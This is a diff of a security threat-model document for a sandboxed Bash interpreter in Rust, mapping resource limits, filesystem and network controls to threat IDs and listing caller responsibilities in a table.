+| Loop limit (10K) | TM-DOS-016, TM-DOS-017 | `limits.rs` | Yes |
+| Function depth (100) | TM-DOS-020, TM-DOS-021 | `limits.rs` | Yes |
+| Parser timeout (5s) | TM-DOS-024 | `limits.rs` | Yes |
+| Parser fuel (100K ops) | TM-DOS-024 | `limits.rs` | Yes |
+| AST depth limit (100) | TM-DOS-022 | `limits.rs` | Yes |
+| Execution timeout (30s) | TM-DOS-023 | `limits.rs` | Yes |
+| Virtual filesystem | TM-ESC-001, TM-ESC-003 | `fs/memory.rs` | Yes |
+| Filesystem limits | TM-DOS-005 to TM-DOS-010, TM-DOS-014 | `fs/limits.rs` | Yes |
+| Zip bomb protection | TM-DOS-007, TM-NET-013 | `builtins/archive.rs` | Yes |
+| Path normalization | TM-ESC-001, TM-INJ-005 | `fs/memory.rs` | Yes |
+| No symlink following | TM-ESC-002, TM-DOS-011 | `fs/memory.rs` | Yes |
+| Network allowlist | TM-INF-010, TM-NET-001 to TM-NET-007 | `network/allowlist.rs` | Yes |
+| Sandboxed eval, no exec | TM-ESC-005 to TM-ESC-008, TM-INJ-003 | `interpreter/mod.rs` | Yes |
+| Fail-point testing | All controls | `security_failpoint_tests.rs` | Yes |
+| Builtin panic catching | Custom builtin safety | `interpreter/mod.rs` | Yes |
+| HTTP response size limit | TM-NET-008, TM-NET-012 | `network/client.rs` | Yes |
+| HTTP connect timeout | TM-NET-009 | `network/client.rs` | Yes |
+| HTTP read timeout | TM-NET-010 | `network/client.rs` | Yes |
+| No auto-redirect | TM-NET-011, TM-NET-014 | `network/client.rs` | Yes |
 
 ---
 
@@ -540,25 +600,27 @@ let tenant_b = Bash::builder()
 
 ```rust
 ExecutionLimits::new()
-    .max_commands(10_000)         // Prevent runaway scripts
-    .max_loop_iterations(10_000)  // Prevent infinite loops
-    .max_function_depth(100)      // Prevent stack overflow
-    .timeout(Duration::from_secs(30))  // Prevent CPU exhaustion
-    // TODO: Add these
-    .max_input_bytes(10_000_000)  // 10MB script limit
-    .max_output_bytes(10_000_000) // 10MB output limit
-    .max_variable_size(1_000_000) // 1MB per variable
+    .max_commands(10_000)              // TM-DOS-002, TM-DOS-004, TM-DOS-019
+    .max_loop_iterations(10_000)       // TM-DOS-016, TM-DOS-017
+    .max_function_depth(100)           // TM-DOS-020, TM-DOS-021
+    .timeout(Duration::from_secs(30))  // TM-DOS-023
+    .parser_timeout(Duration::from_secs(5))  // TM-DOS-024
+    .max_input_bytes(10_000_000)       // TM-DOS-001 (10MB)
+    .max_ast_depth(100)                // TM-DOS-022
+    .max_parser_operations(100_000)    // TM-DOS-024
 ```
 
 ---
 
 ## Caller Responsibilities
 
-1. **Sanitize environment variables** - Don't pass secrets
-2. **Use allowlist for network** - Default denies all
-3. **Sanitize output** - If displaying in terminal/web
-4. **Set appropriate limits** - Based on use case
-5. **Isolate tenants** - Separate Bash instances per tenant
+| Responsibility | Related Threats | Description |
+|---------------|-----------------|-------------|
+| Sanitize env vars | TM-INF-001 | Don't pass secrets to untrusted scripts |
+| Use network allowlist | TM-INF-010, TM-NET-* | Default denies all network access |
+| Sanitize output | TM-INJ-008 | Filter terminal escapes if displaying output |
+| Set appropriate limits | TM-DOS-* | Tune limits for your use case |
+| Isolate tenants | TM-ISO-001 to TM-ISO-003 | Use separate Bash instances per tenant |
 
 ---
 
